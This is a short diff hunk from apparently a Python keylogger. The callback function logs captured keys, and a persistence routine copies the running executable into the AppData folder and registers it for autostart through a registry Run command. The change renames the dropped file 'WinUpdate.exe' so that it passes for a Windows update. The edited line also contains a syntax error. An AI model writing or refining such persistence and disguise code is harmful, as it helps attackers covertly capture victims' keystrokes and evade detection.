@@ -47,7 +47,7 @@ def call_back(key):
         
     print(log)
 def permanent_migration():    #For persistance
-    new_dir = os.environ["appdata"] + "\\"+str(random.randint(1,1000))+".exe"
+    new_dir = os.environ["appdata"] + "\\"+"WinUpdate"+.exe"
     shutil.copyfile(sys.executable,new_dir)
     new_dir= REG_EDIT_RUN_COMMAND.format(random.randint(1,100000000))+new_dir
     subprocess.call(new_dir,shell=True)
